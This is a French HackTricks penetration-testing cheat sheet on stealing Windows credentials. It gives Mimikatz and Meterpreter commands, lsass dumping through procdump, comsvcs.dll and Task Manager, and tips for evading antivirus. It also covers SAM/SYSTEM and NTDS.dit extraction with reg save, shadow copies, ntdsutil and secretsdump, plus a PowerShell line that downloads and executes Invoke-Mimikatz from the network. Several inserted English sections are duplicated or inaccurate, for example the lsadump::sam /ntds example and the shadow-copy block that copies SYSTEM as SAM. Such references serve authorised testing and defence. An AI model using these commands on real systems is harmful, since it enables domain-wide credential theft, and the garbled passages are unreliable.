# Vol de crédentiels Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mimikatz des crédentiels
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Découvrez d'autres fonctionnalités de Mimikatz dans** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Apprenez-en plus sur certaines protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**

## Identifiants avec Meterpreter

Utilisez le [**Plugin Credentials**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contournement de l'AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil légitime de Microsoft**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **extraire le processus lsass**, **télécharger le dump** et **extraire** les **informations d'identification localement** à partir du dump.

{% code title="Extraire lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Extraire les identifiants à partir du dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz) : `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque** : Certains **AV** peuvent **détecter** comme **malveillante** l'utilisation de **procdump.exe pour extraire lsass.exe**, cela est dû à la détection des chaînes **"procdump.exe" et "lsass.exe"**. Il est donc plus **furtif** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu du** nom lsass.exe.

### Extraction de lsass avec **comsvcs.dll**

Il existe une DLL appelée **comsvcs.dll**, située dans `C:\Windows\System32`, qui **extrait la mémoire du processus** lorsqu'ils **plantent**. Cette DLL contient une **fonction** appelée **`MiniDumpW`** qui est conçue pour être appelée avec `rundll32.exe`.\
Les deux premiers arguments ne sont pas utilisés, mais le troisième est divisé en 3 parties. La première partie est l'ID du processus qui sera extrait, la deuxième partie est l'emplacement du fichier d'extraction, et la troisième partie est le mot **full**. Il n'y a pas d'autre choix.\
Une fois que ces 3 arguments ont été analysés, cette DLL crée le fichier d'extraction et extrait le processus spécifié dans ce fichier d'extraction.\
Grâce à cette fonction, nous pouvons utiliser **comsvcs.dll** pour extraire le processus lsass au lieu de télécharger procdump et de l'exécuter. (Cette information a été extraite de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Nous devons simplement garder à l'esprit que cette technique ne peut être exécutée qu'en tant que **SYSTEM**.

**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass avec le Gestionnaire des tâches**

1. Cliquez avec le bouton droit de la souris sur la barre des tâches et cliquez sur Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processus
4. Cliquez avec le bouton droit de la souris sur le processus "Local Security Authority Process" et cliquez sur "Créer un fichier de vidage".

### Dumping lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
CrackMapExec is a powerful tool used for various hacking techniques. One of its capabilities is the ability to dump SAM hashes. SAM (Security Account Manager) is a database file in Windows that stores user account information, including password hashes.

To dump SAM hashes using CrackMapExec, you can use the following command:

```
crackmapexec <target> -u <username> -p <password> --sam
```

Replace `<target>` with the IP address or hostname of the target machine. `<username>` and `<password>` should be replaced with valid credentials for authentication.

This command will initiate the dumping process and retrieve the SAM hashes from the target machine. These hashes can then be used for further analysis and potential password cracking.

It is important to note that dumping SAM hashes without proper authorization is illegal and unethical. This technique should only be used for legitimate purposes, such as penetration testing or authorized security assessments.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Voler les secrets LSA

---

#### Description

Le vol des secrets LSA est une technique couramment utilisée pour extraire les informations d'identification stockées localement sur un système Windows. Les secrets LSA (Local Security Authority) sont des données sensibles telles que les mots de passe enregistrés, les clés de chiffrement et les jetons d'authentification.

Cette technique consiste à extraire les secrets LSA à partir de la mémoire du système, ce qui permet aux attaquants d'accéder aux informations d'identification des utilisateurs et de les utiliser pour compromettre davantage le système.

#### Méthode

1. Ouvrez une invite de commande en tant qu'administrateur.

2. Exécutez la commande suivante pour extraire les secrets LSA :

   ```
   mimikatz.exe "sekurlsa::logonPasswords"
   ```

   Cette commande utilise l'outil Mimikatz pour extraire les secrets LSA à partir de la mémoire du système.

3. Les informations d'identification volées seront affichées dans la sortie de la commande. Recherchez les champs "Nom d'utilisateur" et "Mot de passe" pour obtenir les informations d'identification.

#### Contre-mesures

Pour protéger les secrets LSA contre le vol, vous pouvez prendre les mesures suivantes :

- Mettez à jour régulièrement votre système d'exploitation avec les derniers correctifs de sécurité.

- Utilisez des mots de passe forts et uniques pour tous les comptes d'utilisateur.

- Activez la fonctionnalité de chiffrement du disque pour protéger les données sensibles.

- Utilisez des outils de détection d'intrusion pour surveiller les activités suspectes sur le système.

- Restreignez les privilèges d'accès aux comptes d'utilisateur pour limiter les possibilités d'exploitation.

---

**Avertissement :** L'utilisation de cette technique sans autorisation appropriée est illégale. Ce guide est fourni à des fins éducatives uniquement.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extraire le fichier NTDS.dit du contrôleur de domaine cible

To dump the NTDS.dit file from the target Domain Controller (DC), you can use various techniques such as utilizing the `ntdsutil` tool or using a tool like `mimikatz`. The NTDS.dit file contains the Active Directory (AD) database, including user account credentials.

Pour extraire le fichier NTDS.dit du contrôleur de domaine cible (DC), vous pouvez utiliser différentes techniques telles que l'utilisation de l'outil `ntdsutil` ou l'utilisation d'un outil comme `mimikatz`. Le fichier NTDS.dit contient la base de données de l'Active Directory (AD), y compris les informations d'identification des comptes d'utilisateurs.

### Extracting Hashes from NTDS.dit

Once you have obtained the NTDS.dit file, you can extract the password hashes stored within it. These password hashes can be cracked or used for further attacks, such as pass-the-hash or password spraying.

Une fois que vous avez obtenu le fichier NTDS.dit, vous pouvez extraire les empreintes de mots de passe qui y sont stockées. Ces empreintes de mots de passe peuvent être craquées ou utilisées pour d'autres attaques, telles que le pass-the-hash ou le password spraying.

### Cracking Password Hashes

To crack the password hashes extracted from the NTDS.dit file, you can use tools like `hashcat` or `John the Ripper`. These tools utilize various cracking techniques, such as dictionary attacks or brute-force attacks, to recover the original passwords.

Pour craquer les empreintes de mots de passe extraites du fichier NTDS.dit, vous pouvez utiliser des outils tels que `hashcat` ou `John the Ripper`. Ces outils utilisent différentes techniques de craquage, telles que les attaques par dictionnaire ou les attaques par force brute, pour récupérer les mots de passe d'origine.

### Protecting NTDS.dit

To protect the NTDS.dit file and prevent unauthorized access, it is crucial to implement proper security measures. Some recommended practices include:

- Regularly patching and updating the Domain Controllers to mitigate vulnerabilities.
- Implementing strong password policies and enforcing regular password changes.
- Limiting administrative privileges and implementing the principle of least privilege.
- Monitoring and auditing the access to the NTDS.dit file.
- Encrypting the NTDS.dit file using technologies like BitLocker.

Pour protéger le fichier NTDS.dit et empêcher tout accès non autorisé, il est crucial de mettre en place des mesures de sécurité appropriées. Voici quelques pratiques recommandées :

- Appliquer régulièrement les correctifs et les mises à jour sur les contrôleurs de domaine pour atténuer les vulnérabilités.
- Mettre en place des politiques de mots de passe solides et imposer des changements de mot de passe réguliers.
- Limiter les privilèges administratifs et mettre en œuvre le principe du moindre privilège.
- Surveiller et auditer l'accès au fichier NTDS.dit.
- Chiffrer le fichier NTDS.dit à l'aide de technologies telles que BitLocker.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe NTDS.dit du contrôleur de domaine cible

To dump the NTDS.dit password history from a target domain controller (DC), you can use various tools such as `mimikatz` or `lsadump::dcsync` in `impacket`. These tools allow you to retrieve the password hashes stored in the NTDS.dit database, including the password history.

Here's an example using `mimikatz`:

1. First, obtain administrative access to a machine on the target domain.
2. Download `mimikatz` from the official repository: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz).
3. Transfer the `mimikatz` executable to the target machine.
4. Open a command prompt with administrative privileges.
5. Navigate to the directory where `mimikatz` is located.
6. Run the following command to load the `mimikatz` module:

   ```
   mimikatz # privilege::debug
   ```

7. Next, use the following command to dump the NTDS.dit password history:

   ```
   mimikatz # lsadump::sam /system:C:\Windows\system32\config\SYSTEM /security:C:\Windows\system32\config\SECURITY /ntds:C:\Windows\NTDS\NTDS.dit /passwordhistory
   ```

   Replace the paths with the correct locations of the respective files on the target machine.

8. `mimikatz` will then extract the password hashes, including the password history, from the NTDS.dit database.

Remember to always perform these actions within a legal and authorized context, such as during a penetration test or with proper consent.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit

Pour afficher l'attribut pwdLastSet de chaque compte NTDS.dit, vous pouvez utiliser la commande suivante :

```powershell
Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
```

Cette commande récupère tous les utilisateurs de l'annuaire Active Directory et affiche leur nom ainsi que la valeur de l'attribut pwdLastSet.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Vol de SAM & SYSTEM

Ces fichiers doivent être **localisés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.

### À partir du Registre

La manière la plus simple de voler ces fichiers est d'en obtenir une copie à partir du registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hachages** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez effectuer une copie des fichiers protégés en utilisant ce service. Vous devez être administrateur.

#### Utilisation de vssadmin

Le binaire vssadmin est uniquement disponible dans les versions de Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est "C:" et il est enregistré dans C:\users\Public), mais vous pouvez utiliser ceci pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code du livre: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Informations d'identification Active Directory - NTDS.dit**

Le fichier Ntds.dit est une base de données qui stocke les données d'Active Directory, y compris des informations sur les objets utilisateur, les groupes et l'appartenance aux groupes. Il contient les hachages de mot de passe de tous les utilisateurs du domaine.

Le fichier NTDS.dit important se trouve dans : _%SystemRoom%/NTDS/ntds.dit_\
Ce fichier est une base de données _Extensible Storage Engine_ (ESE) et est "officiellement" composé de 3 tables :

* **Table des données** : Contient les informations sur les objets (utilisateurs, groupes...)
* **Table de liaison** : Informations sur les relations (membre de...)
* **Table SD** : Contient les descripteurs de sécurité de chaque objet

Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ainsi, une **partie** du fichier **NTDS.dit** pourrait être située **à l'intérieur de la mémoire de `lsass`** (vous pouvez trouver les données les plus récemment consultées probablement en raison de l'amélioration des performances grâce à une **mise en cache**).

#### Décryptage des hachages à l'intérieur de NTDS.dit

Le hachage est chiffré 3 fois :

1. Décrypter la clé de chiffrement du mot de passe (**PEK**) en utilisant la **BOOTKEY** et **RC4**.
2. Décrypter le **hachage** en utilisant **PEK** et **RC4**.
3. Décrypter le **hachage** en utilisant **DES**.

La **PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais elle est **chiffrée** à l'intérieur du fichier **NTDS.dit** en utilisant la **BOOTKEY** du **fichier SYSTEM du contrôleur de domaine (différent entre les contrôleurs de domaine)**. C'est pourquoi pour obtenir les informations d'identification à partir du fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copie de NTDS.dit à l'aide de Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez également utiliser l'astuce [**volume shadow copy**](./#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **Extraction des hachages depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hachages** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également les extraire automatiquement en utilisant un utilisateur administrateur de domaine valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les **grands fichiers NTDS.dit**, il est recommandé de l'extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le module **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'ensemble des objets et de leurs attributs pour une extraction d'informations ultérieure lorsque le fichier brut NTDS.dit est déjà récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La ruche `SYSTEM` est facultative mais permet le décryptage des secrets (hachages NT et LM, informations supplémentaires telles que les mots de passe en clair, les clés Kerberos ou de confiance, l'historique des mots de passe NT et LM). En plus d'autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hachages, indicateurs UAC, horodatage de la dernière connexion et du changement de mot de passe, descriptions des comptes, noms, UPN, SPN, groupes et adhésions récursives, arborescence des unités organisationnelles et adhésions, domaines de confiance avec type, direction et attributs...

## Lazagne

Téléchargez le binaire à partir de [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des informations d'identification de plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire les informations d'identification de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire les informations d'identification de la mémoire. Téléchargez-le depuis: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraire les informations d'identification du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les informations d'identification du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) et **exécutez-le** simplement pour extraire les mots de passe.

## Défenses

[**Apprenez-en plus sur certaines protections des identifiants ici.**](credentials-protections.md)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PRs au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
